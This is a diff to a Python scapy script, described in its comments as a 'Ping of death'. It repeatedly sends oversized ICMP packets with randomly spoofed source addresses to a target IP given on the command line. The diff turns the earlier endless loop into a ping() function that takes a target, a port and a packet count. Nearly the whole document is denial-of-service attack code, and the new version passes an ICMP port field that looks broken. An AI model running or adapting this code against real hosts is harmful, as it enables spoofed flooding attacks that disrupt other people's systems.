@@ -3,7 +3,7 @@ from scapy.all import *
 from datetime import datetime
 import random
 
-TARGET_MACHINE_IP = ""
+
 
 def random_address_generator():
     """ Generate a random spoofed src ip address"""
@@ -16,19 +16,22 @@ def random_address_generator():
     return (addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d)
 
 
+def ping(targetedIp, targetedPort, numOfPackages):
+    spoofed_ip = random_address_generator()
+    for i in range(0, numOfPackages):
+        spoofed_ip = random_address_generator()
+        time = datetime.now()
+        print("[{0}]: Attacker PC pinging victim PC with IP:{1} with src IP:{2}".format(time.strftime("%H:%M:%S"),targetedIp,spoofed_ip))
+        ip_header = IP(src=spoofed_ip, dst=targetedIp)
+        packet = ip_header/ICMP(dport=targetedPort)/("d"*60000)
+        send(packet)
 if __name__ == "__main__":
 
     # The Ping of death algorithm works
     # by generating a random spoofed ip address
-    # and then sending a big IPV4 packet
-    while 1:
-        spoofed_ip = random_address_generator
-        time = datetime.now()
-        print("[{0}]: Attacker PC pinging victim PC with IP:{1} with src IP:{2}".format(time.strftime("%H:%M:%S"),TARGET_MACHINE_IP,spoofed_ip))
-        ip_header = IP(src=spoofed_ip, dst=TARGET_MACHINE_IP)
-        packet = ip_header/ICMP()/("d"*60000)
-        send(packet)
+    # and then sending a big IPV4 packet to the targeted ip 
+    """Cmd args: targetIp, TargetedPort, NumberOfPackagesToSend"""
+    print("Preparing to ping victim PC")
+    ping(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
 
 
-
-    # for i in range(0,NUM_OF_PACKAGES):
